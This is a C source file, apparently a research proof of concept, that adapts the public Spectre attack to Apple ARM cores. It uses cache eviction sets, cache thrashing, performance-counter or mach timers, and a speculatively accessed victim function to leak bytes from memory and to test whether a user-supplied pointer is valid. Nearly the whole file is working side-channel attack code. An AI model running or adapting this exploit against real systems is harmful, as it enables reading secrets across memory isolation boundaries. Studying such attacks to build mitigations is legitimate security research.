#include <assert.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

// for OS X kext timer
#include <inttypes.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <unistd.h>

#include "util/util.h"

// Code adapted from the example spectre attack available here:
// https://github.com/Eugnis/spectre-attack

static jmp_buf retry;

#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

/* intrinsic for clflush instruction */
#define _mm_clflush(addr)                                                      \
    do {                                                                       \
        *addr += 1;                                                            \
    } while (0)

#define MSB_MASK 0x8000000000000000
#define DEP(x) (x & MSB_MASK)

#define LOAD(pointer)                                                          \
    asm volatile("LDR %[val], [%[ptr]]\n\t"                                    \
                 : [val] "=r"(val)                                             \
                 : [ptr] "r"(pointer));

#ifdef KEXT
#define SREG_WRITE(SR, V)                                                      \
    __asm__ volatile("msr " SR ", %0 \r\n isb \r\n dsb sy \r\n"                \
                     :                                                         \
                     : "r"((uint64_t)V))
#define SREG_READ(SR)                                                          \
    ({                                                                         \
        uint64_t VAL = 0;                                                      \
        __asm__ volatile("isb \r\n mrs %0, " SR " \r\n isb \r\n dsb sy \r\n"   \
                         : "=r"(VAL));                                         \
        VAL;                                                                   \
    })
#endif // KEXT

#define INST_SYNC asm volatile("ISB")
#define DATA_SYNC asm volatile("DSB SY")
#define MEM_BARRIER                                                            \
    DATA_SYNC;                                                                 \
    INST_SYNC

#ifdef KEXT
#define SREG_PMCR0 "S3_1_c15_c0_0"
#define SREG_PMCR1 "S3_1_c15_c1_0"
#define SREG_PMESR0 "S3_1_c15_c5_0"
#define SREG_PMESR1 "S3_1_c15_c6_0"
#define SREG_PMC0 "S3_2_c15_c0_0"
#define SREG_PMC1 "S3_2_c15_c1_0"
#define SREG_PMC2 "S3_2_c15_c2_0"
#define SREG_PMC3 "S3_2_c15_c3_0"
#define SREG_PMC4 "S3_2_c15_c4_0"
#define SREG_PMC5 "S3_2_c15_c5_0"
#define SREG_PMC6 "S3_2_c15_c6_0"
#define SREG_PMC7 "S3_2_c15_c7_0"
#define SREG_PMC8 "S3_2_c15_c9_0"
#define SREG_PMC9 "S3_2_c15_c10_0"

#define ENABLE 0x3003400ff4ff
#define DISABLE 0x3000400ff403
#define RESET_TIMER SREG_WRITE(SREG_PMC0, 0)
#define READ_TIMER SREG_READ(SREG_PMC0)

#else

#include <mach/mach.h>
#include <mach/mach_time.h>
uint64_t mach_get_time_nano(int32_t zero_dependency) {
    uint64_t t = zero_dependency;
    t += mach_absolute_time();
    return t;
}

#endif // KEXT

#define KB(x) (x * 1024)
#define MB(x) (x * 1024 * 1024)

#define MAX_PRIME 2097289 // maximum index output by the PRNG
#define GRANULARITY 16 // number of uint64_t types that fit in one L2 cache line
#define ARR_SIZE (MAX_PRIME * GRANULARITY)

// Use a Lehmer RNG as PRNG
// https://en.wikipedia.org/wiki/Lehmer_random_number_generator
#define PNRG_a 75
#define PRNG_m 8388617
#define prng(x) ((PNRG_a * x) % PRNG_m)

#ifdef DEBUGG
#define dprint(...) printf(__VA_ARGS__)
#define dassert(x) assert(x)
#else
#define dprint(...)                                                            \
    do {                                                                       \
    } while (0)
#define dassert(x)                                                             \
    do {                                                                       \
    } while (0)
#endif // DEBUGG

void thrash_cache(uint64_t *e_arr, unsigned len) {
    uint64_t *e_curr = e_arr;
    for (unsigned w = 0; w < 8; w++) {
        for (uint64_t *th_end = e_arr + len; e_curr < th_end;
             e_curr += (128 / sizeof(uint64_t))) {
            _mm_clflush(e_curr);
        }
    }
}

volatile static inline uint64_t access_evset(uint64_t *target,
                                             unsigned set_size) {
    MEM_BARRIER;
    volatile uint64_t val = 0;

    for (unsigned s = 1; s < set_size; s++) {
        *(target + (s * ((128 * 1024)) | (val & 0x80000000)));
    }

    MEM_BARRIER;
    return val & 0x80000000;
}

void rand_fill_array(uint64_t *long_arr) {
    uint64_t *arr = long_arr;
    for (uint64_t *end = long_arr + (ARR_SIZE * 2); arr != end; arr += 16) {
        *(arr + 0) = (unsigned)random();
        *(arr + 1) = (unsigned)random();
        *(arr + 2) = (unsigned)random();
        *(arr + 3) = (unsigned)random();
        *(arr + 4) = (unsigned)random();
        *(arr + 5) = (unsigned)random();
        *(arr + 6) = (unsigned)random();
        *(arr + 7) = (unsigned)random();
        *(arr + 8) = (unsigned)random();
        *(arr + 9) = (unsigned)random();
        *(arr + 10) = (unsigned)random();
        *(arr + 11) = (unsigned)random();
        *(arr + 12) = (unsigned)random();
        *(arr + 13) = (unsigned)random();
        *(arr + 14) = (unsigned)random();
        *(arr + 15) = (unsigned)random();
    }
}

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[128];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[128];
#define ARRAY2_SIZE ((256 * 512 * 128))
uint8_t *array2;
uint64_t *thrash_arr;
uint64_t **aop;
uint64_t *data;

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x, size_t y, size_t z) {
    /* if (x < array1_size) */
    // array2[512 * 512] holds array1_size, this is
    // so thrash_cache will evict this address
    // array[512 * 512] for speculation experiments holds 1
    /* if (x < array2[512 * 512]) { */
    /* 	temp &= array2[array1[x] * 512]; */
    /* } */
    if (x + y + z <= array2[512 * 512]) {
        temp &= MSB_MASK & *aop[x * 16];
        temp &= MSB_MASK & *aop[y * 16];
        temp &= MSB_MASK & *aop[z * 16];
    }
}

/********************************************************************
Analysis code
********************************************************************/
/* #define CACHE_HIT_THRESHOLD (80) /\* assume cache hit if time <= threshold
 * *\/ */
/* #define CACHE_HIT_THRESHOLD (150) /\* assume cache hit if time <= threshold
 * *\/ */
#define CACHE_HIT_THRESHOLD (90) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x, training_y, y, training_z, z;
    malicious_x = 0;
    size_t malicious_y = 1;
    size_t malicious_z = 2;
    register uint64_t time1, time2, timedif;
    volatile uint8_t *addr;

    /* array2[512 * 512] = array1_size; */
    array2[512 * 512] = 1;

#define TRIES 10
    static uint64_t times[(TRIES * 2) * 256];

    for (i = 0; i < 256; i++)
        results[i] = 0;

    for (tries = TRIES; tries > 0; tries--) {
#ifdef KEXT
        setjmp(retry);
#endif // KEXT

        /* Flush array2[256*(0..255)] from cache */
        /* for (i = 0; i < 256; i++) */
        /* 	_mm_clflush(&array2[i * 512]); /\* intrinsic for clflush
         * instruction *\/ */
        for (i = 0; i < 256; ++i)
            access_evset((uint64_t *)(array2 + i * 512), 9);
        thrash_cache(thrash_arr, ARR_SIZE * 2);

        MEM_BARRIER;

        /* 30 loops: 5 training runs (x=training_x) per attack run
         * (x=malicious_x) */
        training_x = tries % array1_size;
        training_y = 0;
        training_z = 0;
        for (j = 49; j >= 0; j--) {
            /* _mm_clflush(&array1_size); */
            /* access_evset(&array1_size, 9); */
            thrash_cache(thrash_arr, ARR_SIZE * 2);

            MEM_BARRIER;
            /* Delay (can also mfence) */
            for (volatile int z = 0; z < 100; z++) {
            }

            /* Avoid jumps in case those tip off the branch predictor */
            x = !(j % 10) * malicious_x;
            y = !(j % 10) * malicious_x + 1;
            z = !(j % 10) * malicious_x + !(j % 10) * 2;

            /* printf("x is %zu, y is %zu, z is %zu\n", x, y, z); */

            /* Call the victim! */
            victim_function(x, y, z);
        }
#ifdef KEXT
        RESET_TIMER;
#endif // KEXT
        MEM_BARRIER;

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
#ifdef KEXT
            time1 = DEP(mix_i);
            time1 += READ_TIMER;
#else
            time1 = mach_get_time_nano(mix_i);
#endif // KEXT
            junk = array2[(mix_i + DEP(time1)) * 512];
#ifdef KEXT
            time2 = DEP(junk);
            time2 += READ_TIMER;
#else
            time2 = mach_get_time_nano(junk);
#endif // KEXT
            timedif = time2 - time1;
            if (timedif <= CACHE_HIT_THRESHOLD &&
                mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value
                                   */

#ifdef KEXT
            RESET_TIMER;
#endif // KEXT
            MEM_BARRIER;

            assert(!DEP(time1));
            assert(!DEP(time2));
            times[mix_i * TRIES + tries] = timedif;
        }
#ifdef KEXT
        setjmp(retry);
#endif // KEXT
    }
    // Print tries
    for (size_t idx = 0; idx < 256; ++idx) {
        printf("array2[%zu * 512] times = ", idx);
        for (size_t try = 0; try <= 10; ++try) {
            if (times[idx * TRIES + try]) {
                printf("%llu,", times[idx * TRIES + try]);
            }
        }
        printf("\n");
    }

    results[0] ^= junk; /* use junk so code above won't get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv) {
#ifdef KEXT
    // Set up signal handler for SIGILL on timer resets for PMC
    init_retry_barrier();

    // Put on a firestorm core
    pin_cpu(7);

    // Just in case the process is scheduled on a core different
    // from the current one which has the PMC enabled on
    setjmp(retry);
    init_timer();
#else
    pin_cpu(7);
#endif // KEXT

    // For thrashing the cache
    thrash_arr =
        (uint64_t *)aligned_alloc(128, ARR_SIZE * 2 * sizeof(uint64_t));
    assert(thrash_arr);
    rand_fill_array(thrash_arr);
    thrash_cache(thrash_arr, ARR_SIZE * 2);

    array2 = mmap(0, ARRAY2_SIZE, PROT_READ | PROT_WRITE,
                  MAP_ANON | MAP_PRIVATE, -1, 0);
    assert(array2 != MAP_FAILED);

    printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
    size_t malicious_x =
        (size_t)(secret - (char *)array1); /* default for malicious_x */
    printf("malicious_x is %zu\n", malicious_x);
    int score[2], len = strlen(secret);
    uint8_t value[2];

    // Let the running user set the pointer we're going to guess on the command
    // line
    uint8_t *target_ptr = NULL;
    printf("[+] thrash_arr is at %p\n"
           "[+] array2 is at %p\n",
           thrash_arr, array2);
    printf("[?] Enter an address to be checked: ");
    scanf("%p", &target_ptr);
    printf("[+] Checking ptr %p\n", target_ptr);

    /* write to array2 so in RAM not copy-on-write zero pages */
    for (size_t i = 0; i < ARRAY2_SIZE; i++)
        array2[i] = 1;

    if (argc == 3) {
        sscanf_s(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1; /* Convert input value into a pointer */
        sscanf_s(argv[2], "%d", &len);
        printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);

        // Put secret right after argv[1]
        memcpy(&array1[16], argv[1], len);
        /* malicious_x = (size_t) &array1[16]; */
        malicious_x = 16;
    }

    for (size_t idx = 0; idx < 160 && array1[idx]; ++idx) {
        printf("array1[%zu] <- %c\n", idx, array1[idx]);
    }

#define TOTAL_PTRS (8)
#define PTRS_PER_CACHELINE (16)
#define BYTES ((TOTAL_PTRS * PTRS_PER_CACHELINE * sizeof(uint64_t *)))
#define BYTES_PER_L2_LINE (128)
    aop = mmap(NULL, BYTES, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1,
               0);
    assert(aop != MAP_FAILED);
    assert((uintptr_t)(aop + BYTES) %
           (1 << 21)); // Not pushed up against 2MB bound

    data = mmap(NULL, BYTES_PER_L2_LINE * TOTAL_PTRS, PROT_READ | PROT_WRITE,
                MAP_ANON | MAP_PRIVATE, -1, 0);
    assert(data != MAP_FAILED);

    memset(aop, 0, BYTES);
    size_t data_indices[8] = {7, 3, 0, 2, 4, 6, 1, 5};
    for (size_t i = 0; i < BYTES_PER_L2_LINE * TOTAL_PTRS / sizeof(uint64_t *);
         ++i) {
        data[i] = rand() % 179;
    }

    // This is main *set up* for the PoC. The target_ptr is the ptr that we are
    // testing for validity. `array2 + some offset' are all valid and controlled
    // here by the test program (or attacker). After speculatively accessing
    // through aop[0 * PTRS_PER_CACHELINE], aop[1 * ...], aop[2 * ...], we will
    // test the access time to array2 + 103 * 512.
    aop[0 * PTRS_PER_CACHELINE] = (uint64_t *)(array2 + (178 * 512));
    aop[1 * PTRS_PER_CACHELINE] = (uint64_t *)(array2 + (65 * 512));
    /* aop[2 * PTRS_PER_CACHELINE] = (uint64_t*) (array2 + (133 * 512)); */
    aop[2 * PTRS_PER_CACHELINE] = (uint64_t *)target_ptr;

    aop[3 * PTRS_PER_CACHELINE] = (uint64_t *)(array2 + (103 * 512));
    aop[4 * PTRS_PER_CACHELINE] = (uint64_t *)(array2 + (103 * 512));
    aop[5 * PTRS_PER_CACHELINE] = (uint64_t *)(array2 + (103 * 512));
    aop[6 * PTRS_PER_CACHELINE] = (uint64_t *)(array2 + (103 * 512));
    aop[7 * PTRS_PER_CACHELINE] = (uint64_t *)(array2 + (103 * 512));

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        // run the experiment and test the time
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ",
               (score[0] && score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X='%c' score=%d)", value[1],
                   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
                   score[1]);
        printf("\n");
    }
    assert(!munmap(aop, BYTES));
    assert(!munmap(data, BYTES_PER_L2_LINE * TOTAL_PTRS));
    return (0);
}
